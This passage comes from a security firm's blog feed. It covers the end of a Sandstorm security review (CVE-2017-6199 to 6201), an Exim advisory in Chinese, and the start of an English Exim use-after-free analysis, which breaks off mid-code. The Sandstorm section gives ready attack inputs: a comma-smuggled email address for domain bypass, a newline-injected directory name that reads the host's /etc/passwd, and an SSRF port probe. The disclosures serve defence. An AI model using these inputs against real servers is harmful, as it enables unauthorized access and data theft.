&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SupervisorMain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setResourceLimits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;rlimit&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rlim_cur&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rlim_max&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4096&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;KJ_SYSCALL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setrlimit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RLIMIT_NOFILE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ref: &lt;a href=&quot;https://github.com/sandstorm-io/sandstorm/blob/v0.202/src/sandstorm/supervisor.c++#L824&quot;&gt;https://github.com/sandstorm-io/sandstorm/blob/v0.202/src/sandstorm/supervisor.c++#L824&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Since supervisor does not restrict the amount of subprocesses and storage usage, attackers can raise a resource exhaustion attack to crash the server by simply uploading a malicious app which keeps calling fork() (aka the â€œfork bombâ€) or consumes huge storage space.&lt;/p&gt;

&lt;h3 id=&quot;cve-2017-6199&quot;&gt;CVE-2017-6199&lt;/h3&gt;

&lt;p&gt;Usually Sandstorm will designate unique permissions to the specific members of a certain organization, and the default membership validation method is to check userâ€™s email address and see whether the string after &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@&lt;/code&gt; exists in their white list. See the codes below:&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;identity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;services&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toLowerCase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;emailDomain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ref: &lt;a href=&quot;https://github.com/sandstorm-io/sandstorm/blob/v0.202/shell/packages/sandstorm-db/db.js#L1112&quot;&gt;https://github.com/sandstorm-io/sandstorm/blob/v0.202/shell/packages/sandstorm-db/db.js#L1112&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Therefore, when an attacker fills in an email like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;demo@devco.re,ccc@aaa.bbb&lt;/code&gt; and the system will automatically consider the attacker a member of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aaa.bbb&lt;/code&gt; organization.&lt;/p&gt;

&lt;p&gt;Another key factor that contributes to the successful attack lies in one of the features when users log on Sandstorm. Users does not need to set up passwords for Sandstorm. Each time when the users need to log onto the service, they only need to fill in their email address, and theyâ€™ll receive a set of random unique password for login. The reason why the example above works is because the system treats &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;demo@devco.re,ccc@aaa.bbb&lt;/code&gt; as a user from aaa.bbb domain, and the random password will be sent to the two email addresses, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;demo@devco.re&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ccc@aaa.bbb&lt;/code&gt; As long as one can receive the password, they can log in to use the service.&lt;/p&gt;

&lt;p&gt;Below is a quick demonstration:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;On Sandstorm, restrict access to users from domain &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aaa.bbb&lt;/code&gt; only.
&lt;img src=&quot;/assets/img/blog/20180126/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;On login page, fill in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;demo@devco.re,ccc@aaa.bbb&lt;/code&gt; for the email field.
(Note: at the front end, the email field is checked with HTML5 validation, but it is not further checked for validity at the back end)
&lt;img src=&quot;/assets/img/blog/20180126/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Retrieve random password in demo@devco.re mailbox.
&lt;img src=&quot;/assets/img/blog/20180126/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Login successful. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;demo@devco.re,ccc@aaa.bbb&lt;/code&gt; is considered as a user and member of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aaa.bbb&lt;/code&gt; organization!
&lt;img src=&quot;/assets/img/blog/20180126/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;In our pentesting, the target website allowed users from validated domains to install their own apps. Therefore, through this bypass exploit, further attacks could be accomplished by combining other vulnerabilities described in this blog post (CVE-2017-6198, CVE-2017-6200, CVE-2017-6201).&lt;/p&gt;

&lt;h3 id=&quot;cve-2017-6200&quot;&gt;CVE-2017-6200&lt;/h3&gt;

&lt;p&gt;This is an interesting vulnerability. Totally two little validation flaws were exploited to initiate this attack!
On Sandstorm, owners of each Grain (Sandstorm container, in short, an app sandbox) can download their backup data for the app. But because of the two vulnerabilities in the packing process, an attacker can pack the files under the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/run&lt;/code&gt; directories located on the server outside the sandbox. The security issues were as follows:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;The packing process has hid &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/proc&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc&lt;/code&gt; and other sensitive directories, but did not hide &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc.host&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/run.host&lt;/code&gt; these two directories. These directories are the aliases for the directories &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/run&lt;/code&gt; on the server respectively, which are relatively newer features.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;The system will pack the legitimate files, have them sorted out, and create zip packages through the standard input interface. The separation between files are determined by line-breaks (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\n&lt;/code&gt;). As a result, when a line-break string appears in the file name, illegal path file names can be injected and packed with zip. Although the app checks whether there is a line-break in the file name, but the directory name was not checked.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Ref: &lt;a href=&quot;https://github.com/sandstorm-io/sandstorm/blob/v0.202/src/sandstorm/backup.c%2B%2B#L271&quot;&gt;https://github.com/sandstorm-io/sandstorm/blob/v0.202/src/sandstorm/backup.c%2B%2B#L271&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;By using these two vulnerabilities together, the attacker simply has to create a directory in the sandbox &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/exp\n/etc.host/passwd\n&lt;/code&gt; , then backup files containing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; on the server can be retrieved through backup downloading function.&lt;/p&gt;

&lt;p&gt;Screenshot of a real-world scenario:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;First, create a new directory in Grain &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/exp\n/etc.host/passwd\n&lt;/code&gt;, and use the Grain Backup function to download the backup file.
&lt;img src=&quot;/assets/img/blog/20180126/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;After unzipping the backup file, from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;etc.host&lt;/code&gt; weâ€™ll see &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; of the server outside the sandbox.
&lt;img src=&quot;/assets/img/blog/20180126/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;cve-2017-6201&quot;&gt;CVE-2017-6201&lt;/h3&gt;

&lt;p&gt;This is a classic SSRF (Server-Side Request Forgery) issue. Sandstorm allow installation of apps from arbitrary sources, and an attacker can simply let the server access a certain location by providing an installation URL. The problem was identified on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://[target]/install/xxxChangeItEveryTimexxx?url=http://127.0.0.1:22/&lt;/code&gt; This sample link confirms whether the serverâ€™s port 22 is open.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20180126/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;center&gt;(Parse Error, which implies serverâ€™s port 22 is open)&lt;/center&gt;

&lt;h2 id=&quot;follow-up-updates&quot;&gt;Follow-up Updates&lt;/h2&gt;

&lt;p&gt;After we reported the vulnerabilities, Sandstorm fixed it immediately and then published an article:
&lt;a href=&quot;https://sandstorm.io/news/2017-03-02-security-review&quot;&gt;https://sandstorm.io/news/2017-03-02-security-review&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Through this pentesting experience, we consider Sandstorm a safe platform with outstanding security mechanisms. This is mainly attributed to its fundamental design rationale: to assume that every app installed is malicious. With this vigilant assumption, Sandstormâ€™s defence mechanisms for the core system become comprehensive and watertight. Apart from the server-side protection, some common client-side attacks (such as XSS, CSRF) are handled properly by Sandstormâ€™s unique countermeasures, such as host name randomization. That is, it is very difficult for attackers to sabotage the server by simply manipulating the apps, and so does privilege escalation through attacking at the client-side.&lt;/p&gt;

&lt;p&gt;Nevertheless, such an impressive platform still had some minor mistakes which led to security issues. Most of the vulnerabilities found this time are improper usages of libraries or negligence of existing defence architecture while introducing new features. These types of vulnerability are also common in our other projects. We would like to take the opportunity to remind developers, always present a comprehensive security review especially when developing new features to avoid vulnerabilities caused by the gaps between defence mechanisms.&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2018/01/26/Sandstorm-Security-Review-CVE-2017-6200-en/</link>
                <guid>https://devco.re/blog/2018/01/26/Sandstorm-Security-Review-CVE-2017-6200-en</guid>
                <pubDate>Fri, 26 Jan 2018 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Exim RCE è³‡å®‰é€šå ± (CVE-2017-16943)</title>
                <description>&lt;h2 id=&quot;å…§å®¹&quot;&gt;å…§å®¹&lt;/h2&gt;

&lt;p&gt;2017/11/23 æˆ‘å€‘ç™¼ç¾ Unix çš„é–‹æºè»Ÿé«” EXIM å«æœ‰ Use-After-Free å¼±é»ï¼ˆCVE-2017-16943ï¼‰ä»¥åŠ Denial-of-Service å¼±é»ï¼ˆCVE-2017-16944ï¼‰ï¼Œ&lt;strong&gt;ç•¶ EXIM ç‰ˆæœ¬æ˜¯ 4.88 æˆ– 4.89 ä¸¦ä¸”æœ‰é–‹å•Ÿ chunking é¸é …ï¼ˆBDAT æŒ‡ä»¤ï¼‰æ™‚&lt;/strong&gt;ï¼Œæ”»æ“Šè€…å¯å‚³é€ç‰¹å®šå­—ä¸²çµ¦ EXIM è§¸ç™¼å¼±é»ï¼Œå¯èƒ½é€ æˆéƒµä»¶ä¼ºæœå™¨è¢«&lt;strong&gt;é ç«¯æ”»æ“Šè€…å…¥ä¾µ&lt;/strong&gt;æˆ–æ˜¯&lt;strong&gt;éƒµä»¶ä¼ºæœå™¨ç„¡æ³•ç¹¼çºŒæä¾›æœå‹™&lt;/strong&gt;ã€‚&lt;/p&gt;

&lt;p&gt;æ ¹æ“š E-Soft Inc. åœ¨ 11 æœˆæ‰€åšçš„èª¿æŸ¥ï¼Œç´„æœ‰ 57è¬å°ï¼ˆ56%ï¼‰çš„éƒµä»¶ä¼ºæœå™¨ä½¿ç”¨ EXIM è»Ÿé«”ã€‚å»ºè­° EXIM çš„ä½¿ç”¨è€…æª¢æŸ¥ç‰ˆæœ¬æ˜¯å¦ç‚º 4.88 æˆ– 4.89ï¼Œè‹¥æ˜¯ï¼Œå‰‡éœ€ä¿®æ”¹ EXIM çš„è¨­å®šï¼Œå°‡ chunking é¸é …&lt;strong&gt;é—œé–‰&lt;/strong&gt;ï¼ˆåœ¨ config è£¡å°‡ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chunking_advertise_hosts&lt;/code&gt; é¸é …ç•™ç©ºï¼‰ï¼Œæˆ–æ˜¯&lt;strong&gt;æ›´æ–°è‡³ 4.89.1 ç‰ˆ&lt;/strong&gt;ï¼Œä»¥é¿å…é­å—æ”»æ“Šã€‚&lt;/p&gt;

&lt;h2 id=&quot;ç´°ç¯€&quot;&gt;ç´°ç¯€&lt;/h2&gt;

&lt;p&gt;è©³ç´°çš„æŠ€è¡“ç´°ç¯€è«‹åƒé–±æˆ‘å€‘çš„ Advisoryï¼š
&lt;a href=&quot;https://devco.re/blog/2017/12/11/Exim-RCE-advisory-CVE-2017-16943-en/&quot;&gt;https://devco.re/blog/2017/12/11/Exim-RCE-advisory-CVE-2017-16943-en/&lt;/a&gt;&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2017/12/11/Exim-RCE-advisory-CVE-2017-16943/</link>
                <guid>https://devco.re/blog/2017/12/11/Exim-RCE-advisory-CVE-2017-16943</guid>
                <pubDate>Mon, 11 Dec 2017 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Road to Exim RCE - Abusing Unsafe Memory Allocator in the Most Popular MTA</title>
                <description>&lt;p&gt;On 23 November, 2017, we reported two vulnerabilities to Exim. These bugs exist in the SMTP daemon and attackers do not need to be authenticated, including CVE-2017-16943 for a use-after-free (UAF) vulnerability, which leads to Remote Code Execution (RCE); and CVE-2017-16944 for a Denial-of-Service (DoS) vulnerability.&lt;/p&gt;

&lt;h2 id=&quot;about-exim&quot;&gt;About Exim&lt;/h2&gt;
&lt;p&gt;Exim is a message transfer agent (MTA) used on Unix systems. Exim is an open source project and is the default MTA on Debian GNU/Linux systems. According to our survey, there are about 600k SMTP servers running exim on 21st November, 2017 (data collected from scans.io). Also, a &lt;a href=&quot;http://www.securityspace.com/s_survey/data/man.201710/mxsurvey.html&quot;&gt;mail server survey&lt;/a&gt; by E-Soft Inc. shows over half of the mail servers identified are running exim.&lt;/p&gt;

&lt;h2 id=&quot;affected&quot;&gt;Affected&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;Exim version 4.88 &amp;amp; 4.89 with chunking option enabled.&lt;/li&gt;
  &lt;li&gt;According to our survey, about 150k servers affected on 21st November, 2017 (data collected from scans.io).&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;vulnerability-details&quot;&gt;Vulnerability Details&lt;/h2&gt;
&lt;p&gt;Through our research, the following vulnerabilies were discovered in Exim. Both vulnerabilies involve in BDAT command. BDAT is an extension in SMTP protocol, which is used to transfer large and binary data. A BDAT command is like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BDAT 1024&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BDAT 1024 LAST&lt;/code&gt;. With the SIZE and LAST declared, mail servers do not need to scan for the end dot anymore. This command was introduced to exim in version 4.88, and also brought some bugs.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Use-after-free in receive_msg leads to RCE (CVE-2017-16943)&lt;/li&gt;
  &lt;li&gt;Incorrect BDAT data handling leads to DoS  (CVE-2017-16944)&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;use-after-free-in-receive_msg-leads-to-rce&quot;&gt;Use-after-free in receive_msg leads to RCE&lt;/h1&gt;

&lt;h3 id=&quot;vulnerability-analysis&quot;&gt;Vulnerability Analysis&lt;/h3&gt;
&lt;p&gt;To explain this bug, we need to start with the memory management of exim. There is a series of functions starts with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_&lt;/code&gt; such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_release&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_reset&lt;/code&gt;. These functions are used to manage dynamically allocated memory and improve performance. Its architecture is like the illustration below:
&lt;img src=&quot;/assets/img/blog/20171211/1.png&quot; alt=&quot;architecture of storeblock&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Initially, exim allocates a big storeblock (default 0x2000) and then cut it into &lt;strong&gt;stores&lt;/strong&gt; when &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get&lt;/code&gt; is called, using global pointers to record the size of unused memory and where to cut in next allocation. Once the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;current_block&lt;/code&gt; is insufficient, it allocates a new block and appends it to the end of the chain, which is a linked list, and then makes &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;current_block&lt;/code&gt; point to it. Exim maintains three &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_pool&lt;/code&gt;, that is, there are three chains like the illustration above and every global variables are actually arrays.
This vulnerability is in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;receive_msg&lt;/code&gt; where exim reads headers: 
&lt;a href=&quot;https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/receive.c#L1817&quot;&gt;receive.c: 1817 receive_msg&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;header_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;oldsize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;header_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;cm&quot;&gt;/* header_size += 256; */&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;header_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;store_extend&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;oldsize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;header_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;newtext&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;store_get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;header_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;memcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;newtext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;store_release&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;newtext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;It seems normal if the store functions are just like realloc, malloc and free. However, they are different and cannot be used in this way. When exim tries to &lt;strong&gt;extend&lt;/strong&gt; store, the function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_extend&lt;/code&gt; checks whether the old store is the latest store allocated in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;current_block&lt;/code&gt;. It returns False immediately if the check is failed.
&lt;a href=&quot;https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/store.c#L276&quot;&gt;store.c: 276 store_extend&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CS&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rounded_oldsize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CS&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next_yield&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;store_pool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;inc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;yield_length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;store_pool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rounded_oldsize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;oldsize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Once &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_extend&lt;/code&gt; fails, exim tries to get a new store and release the old one. After we look into  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get&lt;/code&gt; and store_release, we found that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get&lt;/code&gt; returns a &lt;strong&gt;store&lt;/strong&gt;, but &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_release&lt;/code&gt; releases a &lt;strong&gt;block&lt;/strong&gt; if the store is at the head of it. That is to say, if &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;next-&amp;gt;text&lt;/code&gt; points to the start the &lt;code class=&quot;language-plaintext 